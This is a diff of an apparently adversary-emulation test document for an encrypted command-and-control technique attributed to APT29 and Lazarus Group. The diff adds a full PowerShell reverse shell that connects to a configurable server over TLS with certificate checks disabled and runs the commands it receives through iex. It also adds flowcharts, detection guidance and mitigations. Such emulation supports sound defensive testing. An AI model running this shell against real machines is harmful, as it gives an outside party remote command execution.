@@ -49,60 +49,97 @@ flowchart TD
     class M3 both
 ```
 
-## Atomic Test Analysis
+## Atomic Tests
 
-### Atomic Test #1 - OpenSSL C2
-**Technique:** SSL/TLS Encrypted Command and Control  
-**Adversary Usage:** APT29 & Lazarus Group  
-**Command:**
+- [Atomic Test #1 - OpenSSL C2](#atomic-test-1---openssl-c2)
+
+<br/>
+
+## Atomic Test #1 - OpenSSL C2
+This test emulates encrypted command and control channels used by sophisticated threat actors like APT29 and Lazarus Group. It establishes an SSL/TLS encrypted session while bypassing certificate validation, a technique commonly employed by these groups to evade detection.
+
+**Supported Platforms:** Windows
+
+**auto_generated_guid:** 21caf58e-87ad-440c-a6b8-3ac259964003
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| server_ip | IP of the external server | string | 127.0.0.1|
+| server_port | The port to connect to on the external server | string | 443|
+
+#### Attack Commands: Run with `powershell`! 
 ```powershell
+$server_ip = "#{server_ip}"
+$server_port = "#{server_port}"
+$socket = New-Object Net.Sockets.TcpClient($server_ip, $server_port)
+$stream = $socket.GetStream()
 $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
 $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
+$writer = new-object System.IO.StreamWriter($sslStream)
+$writer.Write('PS ' + (pwd).Path + '> ')
+$writer.flush()
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data | Out-String ) 2>&1;
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $sslStream.Write($sendbyte,0,$sendbyte.Length);
+    $sslStream.Flush()
+}
 ```
 
 ```mermaid
 flowchart TD
-    Start[Atomic Test #1: OpenSSL C2] --> Execute["Execute: PowerShell SslStream creation with certificate validation bypass"]
-
-    Execute --> Breakdown[Command Breakdown]
+    Start[Atomic Test #1: OpenSSL C2] --> EstablishTCP[Establish TCP Connection to #{server_ip}:#{server_port}]
+    EstablishTCP --> CreateStream[Create Network Stream]
+    CreateStream --> CreateSSL[Create SSL Stream with Certificate Bypass]
+    CreateSSL --> Authenticate[Authenticate as Client with TLS 1.2]
+    Authenticate --> SetupIO[Setup Stream Writer/Reader]
+    SetupIO --> InteractiveSession[Establish Interactive C2 Session]
     
-    subgraph Breakdown [SslStream components]
-        P1[New-Object] --> C1[System.Net.Security.SslStream]
-        C1 --> P2["$stream: Underlying network stream"]
-        C1 --> P3["$false: LeaveInnerStreamOpen parameter"]
-        C1 --> P4["Certificate validation callback<br>that always returns $true"]
-        C1 --> M1[AuthenticateAsClient method]
-        M1 --> P5["'fakedomain.example': Target hostname"]
-        M1 --> P6["$null: Client certificates"]
-        M1 --> P7["'Tls12': SSL/TLS version"]
-        M1 --> P8["$false: Check certificate revocation"]
+    subgraph CertificateBypass [Critical Evasion Technique]
+        CB1[Certificate Validation Callback]
+        CB2[Always Returns True]
+        CB3[Bypasses All Certificate Validation]
     end
     
-    Breakdown --> CreateStream[Creates encrypted SSL stream]
-    CreateStream --> BypassValidation[Bypasses certificate validation]
-    BypassValidation --> EstablishConnection[Establishes encrypted connection]
-    EstablishConnection --> Success[Encrypted Channel Established]
+    CreateSSL --> CertificateBypass
+    
+    InteractiveSession --> CommandLoop[Command Execution Loop]
+    CommandLoop --> ReadInput[Read Encrypted Input]
+    ReadInput --> ExecuteCommand[Execute Command via iex]
+    ExecuteCommand --> SendOutput[Send Encrypted Output]
+    SendOutput --> ReadInput
+    
+    classDef evasion fill:#ffcccc,stroke:#ff0000
+    classDef encryption fill:#ccffcc,stroke:#006600
+    classDef execution fill:#ffcc99,stroke:#ff9900
+    
+    class CertificateBypass evasion
+    class CreateSSL,Authenticate encryption
+    class ExecuteCommand execution
 ```
 
 **Command Explanation:**
-```powershell
-$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
-$sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
-```
-- **System.Net.Security.SslStream**: .NET class for SSL/TLS encrypted communications
-- **Certificate validation callback**: `{$True}` bypasses all certificate validation (critical evasion technique)
-- **AuthenticateAsClient**: Method to authenticate as client to server
-- **'fakedomain.example'**: Example C2 domain (would be real domain in attacks)
-- **'Tls12'**: Specifies TLS 1.2 encryption protocol
-- **$false**: Disables certificate revocation checking
+This test establishes an encrypted C2 channel using SSL/TLS with several sophisticated evasion techniques:
 
-Both APT29 and Lazarus Group use SSL/TLS encryption for their command and control channels. This test demonstrates establishing an encrypted C2 session while bypassing certificate validation, which both groups have employed in various campaigns to evade network detection and analysis.
+1. **TCP Connection**: Establishes raw TCP connection to C2 server
+2. **SSL Stream Creation**: Wraps TCP stream in SSL encryption
+3. **Certificate Validation Bypass**: `({$True} -as [Net.Security.RemoteCertificateValidationCallback])` - Critical evasion technique that bypasses all certificate validation, allowing connections to servers with self-signed, expired, or mismatched certificates
+4. **TLS 1.2 Encryption**: Uses strong encryption protocol commonly allowed in enterprise environments
+5. **Interactive Session**: Establishes full interactive command session over encrypted channel
 
-**APT29 Correlation:** APT29 has used encrypted channels extensively in their operations, including during the SolarWinds campaign where they employed various encryption methods for covert communications.
-**Lazarus Correlation:** Lazarus Group frequently uses encrypted C2 channels in their financial attacks and destructive operations to maintain stealthy communications.
+**APT29 & Lazarus Correlation:**
+Both groups extensively use encrypted C2 channels:
+- **APT29**: Used encrypted channels in SolarWinds campaign for covert communications, employing similar certificate validation bypass techniques
+- **Lazarus**: Employs encryption for financial attacks and destructive operations, often using TLS encryption to blend with legitimate traffic
+- **Both**: Use certificate validation bypass to evade detection and connect to infrastructure
 
 #### Dependencies: Run with `powershell`!
-##### Description: PowerShell must be available
+##### Description: PowerShell must be available and have network access
 ##### Check Prereq Commands:
 ```powershell
 if ($PSVersionTable.PSVersion.Major -ge 3) { exit 0 } else { exit 1 }
@@ -138,9 +175,15 @@ Based on this test, defenders should:
 4. **Establish network baselines** to detect unusual encrypted traffic patterns
 5. **Use behavioral detection** for processes making encrypted connections unexpectedly
 
+**Mitigation Strategies:**
+- Implement application control to restrict unnecessary PowerShell usage
+- Use network segmentation to limit unnecessary encrypted traffic
+- Deploy certificate pinning for critical services
+- Implement egress filtering to restrict unnecessary outbound encrypted connections
+
 ## Campaign References
 
-1. **APT29 SolarWinds Campaign** (2020): Used encrypted channels for C2 communications throughout the compromise
+1. **APT29 SolarWinds Campaign** (2020): Used encrypted channels for C2 communications throughout the compromise with certificate validation bypass
 2. **APT29 Various Operations**: Consistently employs encrypted communications for covert espionage
 3. **Lazarus Financial Attacks**: Uses encrypted C2 channels in banking and cryptocurrency theft operations
 4. **Lazarus Destructive Attacks**: Employs encrypted communications in wiper malware campaigns
